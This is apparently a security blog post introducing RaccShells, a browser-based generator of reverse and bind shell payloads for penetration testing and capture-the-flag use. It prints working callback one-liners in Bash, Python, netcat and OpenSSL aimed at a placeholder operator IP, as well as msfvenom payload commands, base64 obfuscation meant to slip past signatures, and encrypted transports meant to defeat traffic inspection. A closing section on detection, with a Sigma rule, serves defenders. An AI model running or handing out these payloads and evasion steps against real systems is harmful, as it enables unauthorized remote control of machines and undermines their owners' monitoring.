---
layout: post
title: "RaccShells: Reverse Shells Made Simple"
---

<img height="200" align="left" src="/images/raccshell_logo.png"> A reverse shell is the bread and butter of post exploitation. Instead of the operator calling into the target, the target calls out and hands back an interactive prompt. Because the victim opens the outbound connection, the shell sails straight past inbound firewall rules that would block a direct login. The only real friction is remembering the exact one liner for every language, interpreter and listener combination, under pressure, often with no internet access on the box.

[RaccShells](https://benjitrapp.github.io/RaccShells/) is a self contained, browser based reverse shell generator that removes that friction. Set your LHOST and LPORT once, pick a shell and a listener, and it hands you a ready to paste command for any of 111 payloads. No server, no dependencies, no install: the whole tool is a single HTML file that runs entirely in the browser, so you can drop it on an air gapped jump box and keep working.

The source code lives at [github.com/BenjiTrapp/RaccShells](https://github.com/BenjiTrapp/RaccShells) under the MIT license.

> RaccShells is built for authorized penetration testing and CTF use only. Everything below assumes you have written permission to test the systems involved.

## Reverse Shell vs. Bind Shell

The two classic shell directions are easy to mix up. The difference is simply who initiates the connection.

| | Reverse Shell | Bind Shell |
|---|---|---|
| **Who connects** | Victim connects back to the operator | Operator connects in to the victim |
| **Listener runs on** | Operator machine | Victim machine |
| **Firewall behavior** | Only needs outbound, slips past inbound filtering | Needs an open inbound port on the victim |
| **Best when** | The default for most engagements | Outbound is blocked but an inbound port is reachable |
| **MITRE** | [T1059](https://attack.mitre.org/techniques/T1059/) Command and Scripting Interpreter | [T1059](https://attack.mitre.org/techniques/T1059/) plus an exposed service |

## How a Reverse Shell Works

The flow is short. The operator listens, the victim connects back, and a socket carries commands one way and output the other.

<pre class="mermaid">
sequenceDiagram
    participant A as Operator listener
    participant V as Victim target
    A->>A: Start a listener on LHOST and LPORT
    V->>A: Outbound connect back to LHOST and LPORT
    A->>V: Send a command over the socket
    V->>A: Return the command output
    Note over A,V: The victim opens the connection, so the shell slips past inbound firewall rules
</pre>

On the operator side, the listener is usually a single command:

```bash
nc -lvnp 4444
```

On the victim side, the classic Bash payload redirects an interactive shell over a raw TCP socket:

```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

Swap `10.10.10.10` and `4444` for your own LHOST and LPORT and you have a working callback. RaccShells templates exactly that substitution across every payload so you never edit by hand.

## RaccShells — What Is Inside

The interface is split into six tabs, each covering a stage of getting and keeping a shell.

<pre class="mermaid">
mindmap
  root((RaccShells))
    Reverse Shells
      Bash and Sh
      Python
      PowerShell
      Perl PHP Ruby
      Go Java Lua Awk
    Bind Shells
    MSFVenom
    Shell Upgrade
      TTY spawn
      stty raw
      socat
    Tools and Listeners
      pwncat
      socat
      CHAOS RAT
    Living off the Land
      Windows LOLBAS
      Linux
      macOS
</pre>

### Reverse Shells

The largest tab, with 72 payloads across Bash, Python, Perl, PHP, Ruby, PowerShell, Java, Go, Lua and Awk. Each one is templated with your LHOST, LPORT and chosen shell binary. The Python variant, for example, is a compact socket plus subprocess one liner:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.10",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/bash","-i"])'
```

Having ten language options matters in the field: the target may not have Bash, but it almost certainly has one of Python, Perl or PHP installed.

### Bind Shells

Fourteen listener side variants for the case where outbound is filtered but you can still reach an inbound port. The victim opens the port and waits, and you connect in:

```bash
# On the victim
nc -lvnp 4444 -e /bin/bash
# On the operator
nc 10.10.10.10 4444
```

### MSFVenom Payloads

Twenty five ready to paste Metasploit payloads with the LHOST and LPORT already filled in, covering staged and stageless shells for Linux and Windows:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe
```

### Shell Upgrade

A raw reverse shell is a dumb shell: no job control, no tab completion, no arrow keys, and Ctrl C kills the whole session. This tab collects the upgrade dance that turns it into a proper PTY:

```bash
# 1. Spawn a PTY inside the dumb shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 2. Background it with Ctrl Z, then on the listener side
stty raw -echo; fg
# 3. Fix the terminal so clear and editors work
export TERM=xterm
```

It also covers `script /dev/null`, the socat fully interactive method, and common binary escapes for when you land in a restricted shell.

### Tools & Listeners

Reference snippets for richer listeners and post shell tooling, including pwncat-cs, pwncat by cytopia, Chashell, HellShell, SSL-AES, FuegoShell, CHAOS RAT and tmate. These trade the bare netcat experience for features like automatic shell upgrading, persistence and encrypted channels.

### Living off the Land

OS specific techniques for download and execute, persistence and tunneling using only trusted binaries, split across Windows (LOLBAS), Linux and macOS. If that topic interests you, I keep a dedicated link collection in the [Living off the Land](https://benjitrapp.github.io/memories/2024-12-22-hacking-and-lotl/) page.

## Obfuscation On The Fly

Static signatures love a plain `bash -i >& /dev/tcp` string. RaccShells can cycle each payload through obfuscation modes before you copy it, with no page reload. The available modes depend on the interpreter:

| Interpreter | Obfuscation modes |
|---|---|
| Bash, Zsh, Sh | base64, variable splitting, hex printf |
| PowerShell | UTF-16LE encoding, character array syntax |
| Python, Perl, PHP, Ruby | Base64 decode variants |

The base64 mode, for instance, wraps the Bash payload so the recognizable string never appears on the command line in clear text:

```bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE= | base64 -d | bash
```

This is light obfuscation, not encryption: a defender who decodes the blob sees the original command. The point is to slip past naive pattern matching, not a tuned detection.

## Encrypted Transport

A handful of payloads wrap the channel in real encryption so that traffic inspection sees only a TLS or DNS stream rather than a plaintext shell. In RaccShells these are marked with gold highlighting and a lock badge, and include OpenSSL, PowerShell TLS, Ncat SSL, HoaxShell over HTTPS, SSL-AES and DNS based channels.

The OpenSSL variant is a good example. The operator runs a TLS listener:

```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```

The victim connects back through an encrypted pipe:

```bash
mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.10.10:4444 > /tmp/s; rm /tmp/s
```

Now a network monitor only sees an opaque TLS session, which defeats simple content matching on the wire.

## Using RaccShells

1. Open [RaccShells](https://benjitrapp.github.io/RaccShells/) in your browser
2. Set **LHOST/IP** and **LPORT** to your listener
3. Choose the **SHELL** binary (`/bin/bash`, `/bin/sh`, `/bin/zsh`, `cmd.exe` or `powershell.exe`)
4. Pick a **LISTENER** (Netcat, Ncat, Socat, Metasploit, pwncat-cs or pwncat)
5. Browse the tab you need and, if you like, cycle the obfuscation mode
6. Copy the payload to the victim and the matching listener to your own box

Use the filter chips to narrow by operating system, encryption support or obfuscation support when you are hunting for one that fits the target.

## Listener Cheat Sheet

The payload is only half the job. Match it with the right catcher:

| Listener | Command | Notes |
|---|---|---|
| Netcat | `nc -lvnp 4444` | The classic, no frills |
| Ncat | `ncat -lvnp 4444 --ssl` | Adds TLS with the ssl flag |
| socat | `socat -,raw,echo=0 tcp-listen:4444` | Hands you a fully interactive PTY |
| rlwrap and nc | `rlwrap nc -lvnp 4444` | Adds readline history and arrow keys |
| Metasploit | `use exploit/multi/handler` | Full session handling and routing |
| pwncat-cs | `pwncat-cs -lp 4444` | Auto upgrades the shell and adds modules |

## Red Team Use Cases

- **Initial foothold** — Drop a callback the moment you land code execution through an upload, an injection or a misconfiguration
- **Interpreter roulette** — When the target lacks Bash, switch to the Python, Perl or PHP variant without leaving the tool
- **Egress evasion** — Reach for an encrypted variant or common port like 443 when the network filters or inspects outbound traffic
- **Offline engagements** — The single HTML file works on an air gapped operator box with no internet to look up syntax
- **CTF speed** — Skip the cheat sheet tab switching and copy a working shell in two clicks

## Detection and Defense

Reverse shells are noisy if you know where to look. From a blue team seat, the same behavior that makes them flexible also makes them detectable.

| Control | What it does |
|---|---|
| **Egress filtering** | Allowlist outbound traffic so a host cannot call home on an arbitrary port |
| **Sysmon network logging** | Event ID 3 records outbound connections, especially from shells and scripting hosts |
| **auditd execve rules** | Flag suspicious child processes such as a shell spawned by a service account |
| **EDR behavioral rules** | Detect interpreters opening sockets and redirecting standard streams (`/dev/tcp`, `pty.spawn`) |
| **Encrypted egress inspection** | TLS inspection or TLS fingerprinting to spot tooling hiding inside HTTPS |
| **Honeytokens and canaries** | Alert the instant a planted credential or fake listener is touched |

A simple process creation rule catches most of the language variants at once:

```yaml
title: Potential Reverse Shell via Common Interpreters
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/python3'
      - '/perl'
    CommandLine|contains:
      - '/dev/tcp/'
      - 'pty.spawn'
      - 'socket.connect'
      - 'sh -i'
  condition: selection
level: high
```

The encrypted and obfuscated variants are the hard ones. They defeat content matching, so detection shifts to behavior: an unusual parent and child process tree, a long lived outbound connection from a scripting host, or a process that holds a socket open while reading from a FIFO.

## Under the Hood

RaccShells is pure vanilla JavaScript in one HTML file, with no build step. The design rests on a small set of ideas.

Every payload is stored as a template with placeholders, and a single builder fills them in from the current inputs:

```javascript
function buildShell(template, lhost, lport, shell) {
  return template
    .replaceAll('{LHOST}', lhost)
    .replaceAll('{LPORT}', lport)
    .replaceAll('{SHELL}', shell);
}
```

Obfuscation is a set of pure functions keyed by mode. Cycling simply swaps which transform wraps the built command, then re renders the snippet in place:

```javascript
const obfuscators = {
  none:   cmd => cmd,
  base64: cmd => `echo ${btoa(cmd)} | base64 -d | bash`,
  // variable splitting, hex printf, PowerShell encoding, and more
};
```

On top of that sit the quality of life touches: animated SVG diagrams that show the traffic flow for each variant, gold highlighting and lock badges for encrypted transports, and filter chips that narrow the list by operating system, encryption or obfuscation support. The terminal aesthetic, a scanline overlay over matrix green monospace, is all CSS.

The result is a tool that does one job well: turn an IP, a port and a target language into a payload you can trust, fast, with nothing to install.

## Further Reading

- [RaccShells Live Tool](https://benjitrapp.github.io/RaccShells/)
- [Source Code on GitHub](https://github.com/BenjiTrapp/RaccShells)
- [MITRE ATT&CK T1059 — Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
- [PayloadsAllTheThings Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [HackTricks: Reverse Shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells-linux)
- [GTFOBins](https://gtfobins.github.io/)
- [Living off the Land link collection](https://benjitrapp.github.io/memories/2024-12-22-hacking-and-lotl/)
